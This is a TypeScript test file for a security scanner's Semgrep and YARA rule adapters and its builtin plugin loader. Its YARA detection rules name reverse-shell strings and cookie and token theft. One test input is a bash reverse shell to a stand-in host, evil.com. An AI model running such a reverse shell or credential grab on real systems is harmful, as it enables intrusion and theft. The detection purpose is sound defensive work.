import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import { parseSemgrepYaml, convertSemgrepRule } from '../src/plugin-system/semgrep-adapter';
import { parseYaraFile, parseYaraContent, convertYaraRule } from '../src/plugin-system/yara-adapter';
import { getBuiltinPlugin } from '../src/plugin-system/plugin-loader';
import type { RuleContext } from '../src/types';

const ctx: RuleContext = {
  session: 'test', channel: 'test', timestamp: Date.now(),
  recentMessages: [], recentFindings: [],
};

describe('Semgrep Adapter', () => {
  const yaml = `rules:
  - id: hardcoded-secret
    message: Hardcoded secret detected
    severity: ERROR
    pattern-regex: password\\s*=\\s*['"][^'"]{8,}
    metadata:
      category: security
      owasp: A3

  - id: eval-usage
    message: Dangerous eval usage
    severity: WARNING
    pattern: eval($X)
`;

  it('parses YAML into SecurityRule[]', () => {
    const rules = parseSemgrepYaml(yaml);
    assert.ok(rules.length >= 1);
    assert.ok(rules[0].id.startsWith('semgrep/'));
  });

  it('rule detects matching content', () => {
    const rules = parseSemgrepYaml(yaml);
    const secretRule = rules.find(r => r.id === 'semgrep/hardcoded-secret');
    assert.ok(secretRule);
    const findings = secretRule.check('password = "mysecretpass123"', 'inbound', ctx);
    assert.ok(findings.length > 0);
    assert.equal(findings[0].severity, 'high');
  });

  it('rule passes clean content', () => {
    const rules = parseSemgrepYaml(yaml);
    const secretRule = rules.find(r => r.id === 'semgrep/hardcoded-secret');
    assert.ok(secretRule);
    const findings = secretRule.check('hello world', 'inbound', ctx);
    assert.equal(findings.length, 0);
  });

  it('handles pattern-either', () => {
    const y = `rules:
  - id: dangerous-func
    message: Dangerous function call
    severity: WARNING
    pattern-either:
      - pattern-regex: eval\\(
      - pattern-regex: exec\\(
`;
    const rules = parseSemgrepYaml(y);
    assert.ok(rules.length >= 1);
    const findings = rules[0].check('eval(user_input)', 'inbound', ctx);
    assert.ok(findings.length > 0);
  });

  it('handles pattern-not-regex exclusion', () => {
    const y = `rules:
  - id: test-exclude
    message: Test
    severity: INFO
    pattern-regex: "password"
    pattern-not-regex: "password_reset"
`;
    const rules = parseSemgrepYaml(y);
    assert.ok(rules.length >= 1);
    // Should be excluded
    const f1 = rules[0].check('password_reset flow', 'inbound', ctx);
    assert.equal(f1.length, 0);
    // Should match
    const f2 = rules[0].check('password = secret', 'inbound', ctx);
    assert.ok(f2.length > 0);
  });
});

describe('YARA Adapter', () => {
  const yaraContent = `
rule detect_suspicious_string : malware {
  meta:
    description = "Detects suspicious reverse shell patterns"
    severity = "critical"
  strings:
    $s1 = "/bin/bash -i" nocase
    $s2 = /nc\\s+-e\\s+\\/bin\\/(sh|bash)/
    $hex1 = { 2F 62 69 6E 2F 73 68 }
  condition:
    any of them
}

rule credential_harvester : suspicious {
  meta:
    description = "Credential harvesting attempt"
  strings:
    $a = "document.cookie" nocase
    $b = "localStorage.getItem" nocase
    $c = ".credentials" nocase
  condition:
    2 of them
}
`;

  it('parses YARA rules', () => {
    const rules = parseYaraFile(yaraContent);
    assert.equal(rules.length, 2);
    assert.equal(rules[0].name, 'detect_suspicious_string');
    assert.ok(rules[0].tags.includes('malware'));
    assert.equal(rules[0].strings.length, 3);
  });

  it('converts to SecurityRule and detects match', () => {
    const rules = parseYaraContent(yaraContent);
    assert.ok(rules.length >= 1);
    const shellRule = rules.find(r => r.id === 'yara/detect_suspicious_string');
    assert.ok(shellRule);
    const findings = shellRule.check('/bin/bash -i >& /dev/tcp/evil.com/4444', 'inbound', ctx);
    assert.ok(findings.length > 0);
    assert.equal(findings[0].severity, 'critical');
  });

  it('credential rule requires 2 of 3 strings', () => {
    const rules = parseYaraContent(yaraContent);
    const credRule = rules.find(r => r.id === 'yara/credential_harvester');
    assert.ok(credRule);

    // Only 1 match — should not trigger
    const f1 = credRule.check('document.cookie is tasty', 'inbound', ctx);
    assert.equal(f1.length, 0);

    // 2 matches — should trigger
    const f2 = credRule.check('steal document.cookie and localStorage.getItem("token")', 'inbound', ctx);
    assert.ok(f2.length > 0);
  });

  it('passes clean content', () => {
    const rules = parseYaraContent(yaraContent);
    for (const rule of rules) {
      const findings = rule.check('hello world, nothing suspicious here', 'inbound', ctx);
      assert.equal(findings.length, 0);
    }
  });

  it('handles hex strings', () => {
    const rules = parseYaraFile(yaraContent);
    const hexStr = rules[0].strings.find(s => s.type === 'hex');
    assert.ok(hexStr);
    assert.equal(hexStr.identifier, '$hex1');
  });
});

describe('Plugin Loader', () => {
  it('getBuiltinPlugin returns all builtin rules', () => {
    const p = getBuiltinPlugin();
    assert.equal(p.source, 'builtin');
    assert.ok(p.plugin.rules.length > 0);
    assert.equal(p.plugin.name, '@clawguard/builtin');
  });

  it('getBuiltinPlugin can disable rules', () => {
    const full = getBuiltinPlugin();
    const partial = getBuiltinPlugin(['prompt-injection', 'data-leakage']);
    assert.ok(partial.plugin.rules.length < full.plugin.rules.length);
    assert.ok(!partial.plugin.rules.some(r => r.id === 'prompt-injection'));
  });
});
